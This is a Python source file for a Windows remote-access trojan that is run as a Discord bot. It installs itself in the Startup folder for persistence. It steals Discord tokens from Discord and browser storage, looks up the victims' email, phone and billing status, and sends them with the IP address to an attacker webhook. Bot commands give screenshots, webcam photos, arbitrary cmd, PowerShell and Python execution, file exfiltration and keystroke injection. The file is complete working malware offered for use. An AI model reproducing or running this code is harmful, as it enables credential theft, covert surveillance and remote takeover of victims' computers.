TOKEN = " # BOT TOKEN # "
WEBHOOK_URL = " # WEBHOOK URL # "


def webhook_info(content, username="Trojan"):
    webhook = {
        "content": content,
        "embeds": "",
        "username": "Trojan",
        "avatar_url": "https://immagini.tpadev.repl.co/trojan.png" 
    }
    return webhook

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

try:
    import GPUtil
    from tabulate import tabulate
    import cv2
    import discord
    from discord.ext import commands
    from discord import client
    trojan = commands.Bot(command_prefix= '>')
    import os
    import socket
    import pyautogui
    import platform
    import shutil
    import pyautogui
    import win32gui
    import json
    import base64
    import sqlite3
    import win32crypt
    from datetime import timezone, datetime, timedelta
    import psutil
    from re import findall
    from json import loads, dumps
    from base64 import b64decode
    from subprocess import Popen, PIPE
    from urllib.request import Request, urlopen
    from datetime import datetime
    from threading import Thread
    from time import sleep
    from sys import argv
    import psutil
    import win32process
except Exception as e:
    urlopen(Request(WEBHOOK_URL, data=dumps(webhook_info(f"ERROR:\n```\n{e}\n```")).encode(), headers=getheaders()))

pc_name = os.getenv("UserName")

if os.name != "nt":
    exit()

system = platform.system()
try:
    shutil.move(argv[0], f'C:\\Users\\{os.getenv("UserName")}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
except Exception as e:
    pass




def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

def normal_info():
    uname = platform.uname()
    boot_time_timestamp = psutil.boot_time()
    bt = datetime.fromtimestamp(boot_time_timestamp)
    return f"""
Computer Name: {os.getenv('username')}
System: {uname.system}
Node Name: {uname.node}
Release: {uname.release}
Version: {uname.version}
Machine: {uname.machine}
Processor: {uname.processor}
Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\n"""


def advence_info(path):
    with open(path, "w") as write:
        write.write( "=" * 40 + "System Information" +  "=" * 40 + "\n")
        uname = platform.uname()
        write.write(f"System: {uname.system}\n")
        write.write(f"Node Name: {uname.node}\n")
        write.write(f"Release: {uname.release}\n")
        write.write(f"Version: {uname.version}\n")
        write.write(f"Machine: {uname.machine}\n")
        write.write(f"Processor: {uname.processor}\n")

        write.write( "=" * 40 + "Boot Time" +  "=" * 40 + "\n")
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        write.write(f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\n")

        write.write( "=" * 40 + "CPU Info" +  "=" * 40 + "\n")
        write.write("Physical cores:" + str(psutil.cpu_count(logical=False)) + "\n")
        write.write("Total cores:" + str(psutil.cpu_count(logical=True)) + "\n")
        cpufreq = psutil.cpu_freq()
        write.write(f"Max Frequency: {cpufreq.max:.2f}Mhz\n")
        write.write(f"Min Frequency: {cpufreq.min:.2f}Mhz\n")
        write.write(f"Current Frequency: {cpufreq.current:.2f}Mhz\n")

        write.write( "=" * 40 + "Memory Information" +  "=" * 40 + "\n")
        svmem = psutil.virtual_memory()
        write.write(f"Total: {get_size(svmem.total)}\n")
        write.write(f"Available: {get_size(svmem.available)}\n")
        write.write(f"Used: {get_size(svmem.used)}\n")
        write.write(f"Percentage: {svmem.percent}%\n")
        write.write("="*20 + "SWAP" + "="*20)
        swap = psutil.swap_memory()
        write.write(f"Total: {get_size(swap.total)}\n")
        write.write(f"Free: {get_size(swap.free)}\n")
        write.write(f"Used: {get_size(swap.used)}\n")
        write.write(f"Percentage: {swap.percent}%\n")

        write.write( "=" * 40 + "Disk Information" +  "=" * 40 + "\n")
        write.write("Partitions and Usage:")
        partitions = psutil.disk_partitions()
        for partition in partitions:
            write.write(f"=== Device: {partition.device} ===\n")
            write.write(f"  Mountpoint: {partition.mountpoint}\n")
            write.write(f"  File system type: {partition.fstype}\n")
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                continue
            write.write(f"  Total Size: {get_size(partition_usage.total)}")
            write.write(f"  Used: {get_size(partition_usage.used)}\n")
            write.write(f"  Free: {get_size(partition_usage.free)}\n")
            write.write(f"  Percentage: {partition_usage.percent}%\n")
        disk_io = psutil.disk_io_counters()
        write.write(f"Total read: {get_size(disk_io.read_bytes)}\n")
        write.write(f"Total write: {get_size(disk_io.write_bytes)}\n")

        write.write( "=" * 40 + "Network Information" + "=" * 40 + "\n")
        if_addrs = psutil.net_if_addrs()
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                write.write(f"=== Interface: {interface_name} ===\n")
                if str(address.family) == 'AddressFamily.AF_INET':
                    write.write(f"  IP Address: {address.address}\n")
                    write.write(f"  Netmask: {address.netmask}\n")
                    write.write(f"  Broadcast IP: {address.broadcast}\n")
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    write.write(f"  MAC Address: {address.address}\n")
                    write.write(f"  Netmask: {address.netmask}\n")
                    write.write(f"  Broadcast MAC: {address.broadcast}\n")
        net_io = psutil.net_io_counters()
        write.write(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}\n")
        write.write(f"Total Bytes Received: {get_size(net_io.bytes_recv)}\n")

        write.write( "=" * 40 + "GPU Details" +  "=" * 40 + "\n")
        gpus = GPUtil.getGPUs()
        list_gpus = []
        for gpu in gpus:
            gpu_id = gpu.id
            gpu_name = gpu.name
            gpu_load = f"{gpu.load*100}%\n"
            gpu_free_memory = f"{gpu.memoryFree}MB\n"
            gpu_used_memory = f"{gpu.memoryUsed}MB\n"
            gpu_total_memory = f"{gpu.memoryTotal}MB\n"
            gpu_temperature = f"{gpu.temperature} °C\n"
            gpu_uuid = gpu.uuid
            list_gpus.append((
                gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
                gpu_total_memory, gpu_temperature, gpu_uuid
            ))

        write.write(tabulate(list_gpus, headers=("id", "name", "load", "free memory", "used memory", "total memory",
                                        "temperature", "uuid")))

def Auth(url):
    def dastela(url):
        WEBHOOK = url
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        PATHS = {
            "Discord"           : ROAMING + "\\discorddevelopment",
            "Discord"           : ROAMING + "\\Discord",
            "Discord Canary"  : ROAMING + "\\discordcanary",
            "Discord PTB"       : ROAMING + "\\discordptb",
            "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
            "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
            
        }
        def getuserdata(token):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
            except:
                pass
        def gettokens(path):
            path += "\\Local Storage\\leveldb"
            tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
            return tokens
        def getip():
            ip = "None"
            try:
                ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
            except:
                pass
            return ip
        def has_payment_methods(token):
            try:
                return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
            except:
                pass
        def send_message(token, chat_id, form_data):
            try:
                urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
            except:
                pass
        def main():
            cache_path = ROAMING + "\\.cache~$"
            prevent_spam = True
            embeds = []
            working = []
            checked = []
            already_cached_tokens = []
            working_ids = []
            ip = getip()
            pc_username = os.getenv("UserName")
            pc_name = os.getenv("COMPUTERNAME")
            user_path_name = os.getenv("userprofile").split("\\")[2]
            for platform, path in PATHS.items():
                if not os.path.exists(path):
                    continue
                for token in gettokens(path):
                    if token in checked:
                        continue
                    checked.append(token)
                    uid = None
                    if not token.startswith("mfa."):
                        try:
                            uid = b64decode(token.split(".")[0].encode()).decode()
                        except:
                            pass
                        if not uid or uid in working_ids:
                            continue
                    user_data = getuserdata(token)
                    if not user_data:
                        continue
                    working_ids.append(uid)
                    working.append(token)
                    username = user_data["username"] + "#" + str(user_data["discriminator"])
                    user_id = user_data["id"]
                    email = user_data.get("email")
                    phone = user_data.get("phone")
                    nitro = bool(user_data.get("premium_type"))
                    billing = bool(has_payment_methods(token))
                    embed = {
                        "color": 0x7289da,
                        "fields": [
                            {
                                "name": "**Account Info**",
                                "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                                "inline": True
                            },
                            {
                                "name": "**PC Info**",
                                "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                                "inline": True
                            },
                            {
                                "name": "**Token**",
                                "value": token,
                                "inline": False
                            }
                        ],
                        "author": {
                            "name": f"{username} ({user_id})",
                        },
                        "footer": {
                            "text": f"By TPA_profile.py"
                        }
                    }
                    embeds.append(embed)
            with open(cache_path, "a") as file:
                for token in checked:
                    if not token in already_cached_tokens:
                        file.write(token + "\n")
            if len(working) == 0:
                working.append('123')   
            webhook = {
                "content": "",
                "embeds": embeds,
                "username": "Token Grabber",
                "avatar_url": "https://immagini.tpadev.repl.co/trojan.png" 
            }
            try:
                urlopen(Request(WEBHOOK, data=dumps(webhook).encode(), headers=getheaders()))
            except:
                pass
        try:
            main()
        except Exception as e:
            print(e)
            pass
    try:
        dastela(url)
    except:
        pass
    os.system('cls')

async def on_command_error(ctx, error):
    error_str = str(error)
    await ctx.send(f'[ERROR]: {error_str}', delete_after=2)

@trojan.event
async def on_ready():
    urlopen(Request(WEBHOOK_URL, data=dumps(webhook_info(f'> logged as **{os.getenv("UserName")}** | {str(socket.gethostname())} ({system})')).encode(), headers=getheaders()))


# - image capture

@trojan.command()
async def screenshot(ctx, pc=pc_name):
    if pc == os.getenv("UserName"):
        pyautogui.screenshot('s.png')
        await ctx.send(file=discord.File('s.png'))
        os.remove("s.png")

@trojan.command()
async def photo(ctx, pc=pc_name):
    if pc == os.getenv("UserName"):
        camera = cv2.VideoCapture(0)
        return_value, image = camera.read()
        cv2.imwrite(f'C:\\Users\\{os.getenv("UserName")}\\f.png', image)
        await ctx.send(file=discord.File(f'C:\\Users\\{os.getenv("UserName")}\\f.png'))
        os.remove(f'C:\\Users\\{os.getenv("UserName")}\\f.png')

# - PC Informations
@trojan.command()
async def token(ctx, pc=pc_name, url=WEBHOOK_URL):
    if pc == os.getenv("UserName"):
        Auth(url)


@trojan.command()
async def ipinfo(ctx, pc):
    if pc == os.getenv("UserName"):
        hostname = socket.gethostname()
        await ctx.send(f"IPv4: {socket.gethostbyname(hostname)}") 

@trojan.command()
async def connections(ctx):
    await ctx.send(f'> **{os.getenv("UserName")}** | {str(socket.gethostname())} ({system})')

@trojan.command()
async def battery(ctx, pc):
    if pc == os.getenv("UserName"):
        battery = psutil.sensors_battery()
        await ctx.send(f"Battery percentage : {battery.percent}\nPower plugged in : {battery.power_plugged}")

@trojan.command()
async def advence_info(ctx, pc=pc_name):
    advence_info(f'C:\\Users\\{os.getenv("UserName")}\\i.txt')
    await ctx.send(f'C:\\Users\\{os.getenv("UserName")}\\i.txt')
    os.remove(f'C:\\Users\\{os.getenv("UserName")}\\i.txt')

@trojan.command()
async def info(ctx, pc=pc_name):
    await ctx.send(f"```yaml\n{normal_info()}\n```")


# - Comunication

@trojan.command(description='>alert [pc name] TITLE;MESSAGE;BUTTON')
async def alert(ctx, pc=pc_name, *, args):
    if pc == os.getenv("UserName"):
        info = args.split(';')
        try:
            text = info[1]
        except:
            text = " - "
        try:
            title = info[0]
        except:
            title = " - "
        try:
            button = info[2]
        except:
            button = " - "
        pyautogui.alert(text=text, title=title, button=button)


@trojan.command(description='>textbox [pc name] TITLE;MESSAGE')
async def textbox(ctx, pc=pc_name, *, args):
    if pc == os.getenv("UserName"):
        cose = args.split(';')
        x = pyautogui.prompt(text=cose[1], title=cose[0] , default='')
        await ctx.send(f'response: `{x}`')

# - Reverse Shell

@trojan.command(description='>textbox TITLE;MESSAGE')
async def cmd(ctx, pc=pc_name, *, args):
    if pc == os.getenv("UserName"):
        os.system(args)

@trojan.command()
async def powershell(ctx, pc=pc_name, *, args):
    if pc == os.getenv("UserName"):
        os.system(f"powershell -c \"{args}\"")

@trojan.command()
async def py(ctx, pc=pc_name, *, code):
    if pc == pc_name:
        try:
            x = exec(code)
        except Exception as e:
            await ctx.send(f'**ERROR:**\n```yaml\n{e}\n```')

# - Files

@trojan.command()
async def cd(ctx, pc=pc_name, *, args):
    if pc == os.getenv("UserName"):
        os.chdir(args)
        await ctx.send(f'current directory: `{os.getcwd()}`')


@trojan.command()
async def file(ctx, pc=pc_name, *, args):
    if pc == os.getenv("UserName"):
        await ctx.send(file=discord.File(args))

@trojan.command()
async def dir(ctx, pc):
    if pc == os.getenv("UserName"):
        await ctx.send(f'FILES:\n```\n{str(os.listdir()).replace("[", "").replace("]", "")}\n```')

# - Keyboard

@trojan.command()
async def write(ctx, pc=pc_name, *, args):
    pyautogui.write(str(args))

@trojan.command()
async def writee(ctx, pc=pc_name, *, args):
    pyautogui.write(str(args))
    pyautogui.press("enter")

@trojan.command()
async def press(ctx, pc=pc_name, *, key="None"):
    if key != "None":
        pyautogui.press(str(key))
    else:
        await ctx.send("invalid key")

@trojan.command()
async def keydown(ctx, pc=pc_name, key="None"):
    if key != "None":
        pyautogui.keyUp(key)
    else:
        await ctx.send("invalid key")

@trojan.command()
async def keyup(ctx, pc=pc_name, key="None"):
    if key != "None":
        pyautogui.keyUp(key)
    else:
        await ctx.send("invalid key")



# ◜ RUN THE TROJAN ◝

while True:
    try:
        trojan.run(TOKEN)
    except:
        try:
            urlopen(Request(WEBHOOK_URL, data=dumps(webhook_info(f"> failed to run the bot.\npc: `{os.getenv('UserName')}`")).encode(), headers=getheaders()))
        except:
            pass